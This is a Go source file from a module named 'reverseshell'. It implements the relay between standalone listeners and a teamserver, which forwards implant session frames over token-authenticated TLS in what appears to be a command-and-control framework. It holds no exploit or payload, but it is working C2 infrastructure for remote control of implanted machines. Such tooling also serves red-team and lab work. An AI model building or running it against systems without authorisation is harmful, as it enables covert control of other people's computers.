// Package relay implements the listener↔teamserver plane (README §6.2): a
// standalone listener terminates implant connections locally and forwards
// whole frames to the teamserver over an authenticated TLS channel. Relay
// messages reuse the session-plane framing; session frames travel opaque
// inside FRAME_RELAY payloads.
package relay

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net"
	"os"
	"sync"
	"time"

	"reverseshell/internal/protocol"
	"reverseshell/internal/transport"
)

// Relay message types (README §6.2).
const (
	TypeListenerHello = "LISTENER_HELLO"
	TypeListenerOK    = "LISTENER_OK"
	TypeListenerError = "LISTENER_ERROR"
	TypeSessionUp     = "SESSION_UP"
	TypeSessionDown   = "SESSION_DOWN"
	TypeFrameRelay    = "FRAME_RELAY"
)

// maxRelayFrame bounds one relay message: a session frame (≤4 MiB) plus its
// JSON/base64 envelope overhead.
const maxRelayFrame = 8 << 20

// Message is one relay-plane message carried inside a protocol frame.
type Message struct {
	Type  string `json:"type"`
	Name  string `json:"name,omitempty"`  // LISTENER_HELLO: listener name
	Token string `json:"token,omitempty"` // LISTENER_HELLO: shared token
	SID   string `json:"sid,omitempty"`   // session correlation (listener-local)
	Data  []byte `json:"data,omitempty"`  // FRAME_RELAY: one session-plane frame
}

// Write sends one relay message as a length-prefixed frame.
func Write(w io.Writer, m *Message) error {
	b, err := json.Marshal(m)
	if err != nil {
		return fmt.Errorf("relay marshal: %w", err)
	}
	return protocol.WriteFrame(w, b)
}

// Read receives one relay message, bounding its size.
func Read(r io.Reader) (*Message, error) {
	b, err := protocol.ReadFrame(r, maxRelayFrame)
	if err != nil {
		return nil, fmt.Errorf("relay read: %w", err)
	}
	var m Message
	if err := json.Unmarshal(b, &m); err != nil {
		return nil, fmt.Errorf("relay unmarshal: %w", err)
	}
	return &m, nil
}

// ServerConfig configures the teamserver's relay endpoint.
type ServerConfig struct {
	Addr     string // TLS bind, e.g. "127.0.0.1:5556"
	Token    string // shared listener token
	CertFile string
	KeyFile  string
}

// Server terminates relay connections from standalone listeners and yields
// one transport.Conn per remote implant session. It implements
// transport.Listener, so the teamserver core treats remote sessions exactly
// like local ones.
type Server struct {
	cfg      ServerConfig
	log      *slog.Logger
	ln       net.Listener
	acceptCh chan transport.Conn
	once     sync.Once
	closed   chan struct{}
}

// NewServer validates the TLS material and binds the relay endpoint.
func NewServer(cfg ServerConfig, log *slog.Logger) (*Server, error) {
	if cfg.Token == "" {
		return nil, fmt.Errorf("relay: token is required")
	}
	cert, err := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
	if err != nil {
		return nil, fmt.Errorf("relay load keypair: %w", err)
	}
	ln, err := tls.Listen("tcp", cfg.Addr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	})
	if err != nil {
		return nil, fmt.Errorf("relay listen %s: %w", cfg.Addr, err)
	}
	if log == nil {
		log = slog.New(slog.NewTextHandler(io.Discard, nil))
	}
	return &Server{
		cfg:      cfg,
		log:      log,
		ln:       ln,
		acceptCh: make(chan transport.Conn, 64),
		closed:   make(chan struct{}),
	}, nil
}

// Accept implements transport.Listener: it yields remote sessions.
func (s *Server) Accept(ctx context.Context) (transport.Conn, error) {
	select {
	case c := <-s.acceptCh:
		return c, nil
	case <-ctx.Done():
		_ = s.Close()
		return nil, ctx.Err()
	}
}

// Addr returns the bound relay address.
func (s *Server) Addr() net.Addr { return s.ln.Addr() }

// Close stops the endpoint.
func (s *Server) Close() error {
	s.once.Do(func() {
		close(s.closed)
		_ = s.ln.Close()
	})
	return nil
}

// Run accepts listener uplinks until ctx is cancelled or Close is called.
func (s *Server) Run(ctx context.Context) error {
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			case <-s.closed:
				return nil
			default:
				return fmt.Errorf("relay accept: %w", err)
			}
		}
		go s.serve(ctx, conn)
	}
}

// serve runs one listener uplink: the HELLO handshake, then the
// multiplexed session stream.
func (s *Server) serve(ctx context.Context, raw net.Conn) {
	defer raw.Close()
	br := bufio.NewReader(raw)

	var writeMu sync.Mutex
	write := func(m *Message) error {
		writeMu.Lock()
		defer writeMu.Unlock()
		return Write(raw, m)
	}

	hello, err := Read(br)
	if err != nil {
		return
	}
	if hello.Type != TypeListenerHello ||
		subtle.ConstantTimeCompare([]byte(hello.Token), []byte(s.cfg.Token)) != 1 {
		s.log.LogAttrs(context.Background(), slog.LevelWarn, "listener.remote.auth.failed",
			slog.String("remote", raw.RemoteAddr().String()),
			slog.String("name", hello.Name))
		_ = write(&Message{Type: TypeListenerError, Data: []byte("invalid listener token")})
		return
	}
	s.log.LogAttrs(context.Background(), slog.LevelInfo, "listener.remote.up",
		slog.String("name", hello.Name),
		slog.String("remote", raw.RemoteAddr().String()))
	if err := write(&Message{Type: TypeListenerOK}); err != nil {
		return
	}

	var (
		mu       sync.Mutex
		sessions = make(map[string]*transport.MemConn)
	)
	defer func() {
		mu.Lock()
		for _, c := range sessions {
			c.Close()
		}
		mu.Unlock()
	}()

	for {
		msg, err := Read(br)
		if err != nil {
			return
		}
		switch msg.Type {
		case TypeSessionUp:
			if msg.SID == "" {
				continue
			}
			mu.Lock()
			if _, dup := sessions[msg.SID]; dup {
				mu.Unlock()
				continue
			}
			mem := transport.NewMemConn("relay:"+raw.RemoteAddr().String(), 16)
			sessions[msg.SID] = mem
			mu.Unlock()
			go s.pump(write, &mu, sessions, mem, msg.SID)
			select {
			case s.acceptCh <- mem:
			case <-s.closed:
				mem.Close()
			case <-time.After(5 * time.Second):
				s.log.Warn("relay accept stalled", "sid", msg.SID)
				mem.Close()
			}
		case TypeFrameRelay:
			mu.Lock()
			mem := sessions[msg.SID]
			mu.Unlock()
			if mem == nil {
				continue
			}
			select {
			case mem.Inbound <- msg.Data:
			case <-mem.Done():
			}
		case TypeSessionDown:
			mu.Lock()
			if mem := sessions[msg.SID]; mem != nil {
				mem.Close()
				delete(sessions, msg.SID)
			}
			mu.Unlock()
		}
	}
}

// pump drains one remote session's outbound frames into the relay wire and
// reports the session down when the teamserver side closes it.
func (s *Server) pump(write func(*Message) error, mu *sync.Mutex, sessions map[string]*transport.MemConn, mem *transport.MemConn, sid string) {
	defer func() {
		mem.Close()
		mu.Lock()
		delete(sessions, sid)
		mu.Unlock()
	}()
	for {
		select {
		case frame := <-mem.Outbound:
			if err := write(&Message{Type: TypeFrameRelay, SID: sid, Data: frame}); err != nil {
				return
			}
		case <-mem.Done():
			_ = write(&Message{Type: TypeSessionDown, SID: sid})
			return
		case <-s.closed:
			mem.Close()
			return
		}
	}
}

// ClientConfig configures a standalone listener's uplink.
type ClientConfig struct {
	Addr     string // teamserver relay address (TLS)
	Token    string
	Name     string
	CAFile   string // verify the teamserver's relay certificate
	Insecure bool   // lab only: skip verification
}

// Client is the uplink a standalone listener uses to feed the teamserver.
type Client struct {
	conn     net.Conn
	br       *bufio.Reader
	writeMu  sync.Mutex
	mu       sync.Mutex
	sessions map[string]transport.Conn
	log      *slog.Logger
	once     sync.Once
}

// Dial connects to the teamserver's relay endpoint and authenticates.
func Dial(ctx context.Context, cfg ClientConfig) (*Client, error) {
	tlsCfg := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: cfg.Insecure, // explicit lab opt-in
	}
	if cfg.CAFile != "" {
		pem, err := os.ReadFile(cfg.CAFile)
		if err != nil {
			return nil, fmt.Errorf("relay read CA %s: %w", cfg.CAFile, err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(pem) {
			return nil, fmt.Errorf("relay CA %s contains no certificates", cfg.CAFile)
		}
		tlsCfg.RootCAs = pool
	}
	if tlsCfg.ServerName == "" {
		if host, _, err := net.SplitHostPort(cfg.Addr); err == nil {
			tlsCfg.ServerName = host
		}
	}
	d := tls.Dialer{NetDialer: &net.Dialer{}, Config: tlsCfg}
	raw, err := d.DialContext(ctx, "tcp", cfg.Addr)
	if err != nil {
		return nil, fmt.Errorf("relay dial: %w", err)
	}
	c := &Client{
		conn:     raw,
		br:       bufio.NewReader(raw),
		sessions: make(map[string]transport.Conn),
		log:      slog.New(slog.NewTextHandler(os.Stderr, nil)),
	}
	if err := c.write(&Message{Type: TypeListenerHello, Name: cfg.Name, Token: cfg.Token}); err != nil {
		_ = raw.Close()
		return nil, fmt.Errorf("relay hello: %w", err)
	}
	reply, err := Read(c.br)
	if err != nil {
		_ = raw.Close()
		return nil, fmt.Errorf("relay await ok: %w", err)
	}
	if reply.Type != TypeListenerOK {
		_ = raw.Close()
		return nil, fmt.Errorf("relay handshake rejected: %s", string(reply.Data))
	}
	go c.readPump()
	return c, nil
}

func (c *Client) write(m *Message) error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	return Write(c.conn, m)
}

// readPump dispatches relay frames to the local agent conns and honors
// teamserver-side SESSION_DOWN.
func (c *Client) readPump() {
	for {
		msg, err := Read(c.br)
		if err != nil {
			c.closeSessions()
			return
		}
		switch msg.Type {
		case TypeFrameRelay:
			c.mu.Lock()
			agent := c.sessions[msg.SID]
			c.mu.Unlock()
			if agent == nil {
				continue
			}
			wctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			if err := agent.Send(wctx, msg.Data); err != nil {
				c.log.Warn("relay write to agent failed", "sid", msg.SID, "error", err)
			}
			cancel()
		case TypeSessionDown:
			c.mu.Lock()
			if agent := c.sessions[msg.SID]; agent != nil {
				delete(c.sessions, msg.SID)
				_ = agent.Close()
			}
			c.mu.Unlock()
		}
	}
}

// Forward relays one terminated implant connection to the teamserver. It
// blocks until the agent connection ends.
func (c *Client) Forward(ctx context.Context, agent transport.Conn) error {
	sid, err := randomSID()
	if err != nil {
		return err
	}
	c.mu.Lock()
	c.sessions[sid] = agent
	c.mu.Unlock()
	defer func() {
		c.mu.Lock()
		delete(c.sessions, sid)
		c.mu.Unlock()
		_ = c.write(&Message{Type: TypeSessionDown, SID: sid})
	}()
	if err := c.write(&Message{Type: TypeSessionUp, SID: sid}); err != nil {
		return fmt.Errorf("relay session up: %w", err)
	}
	for {
		frame, err := agent.Recv(ctx)
		if err != nil {
			return err
		}
		if err := c.write(&Message{Type: TypeFrameRelay, SID: sid, Data: frame}); err != nil {
			return fmt.Errorf("relay forward: %w", err)
		}
	}
}

func (c *Client) closeSessions() {
	c.mu.Lock()
	for sid, a := range c.sessions {
		_ = a.Close()
		delete(c.sessions, sid)
	}
	c.mu.Unlock()
}

// Close tears the uplink down; local agent connections unblock and error.
func (c *Client) Close() error {
	c.once.Do(func() {
		_ = c.conn.Close()
	})
	c.closeSessions()
	return nil
}

func randomSID() (string, error) {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("read random bytes: %w", err)
	}
	return hex.EncodeToString(b), nil
}
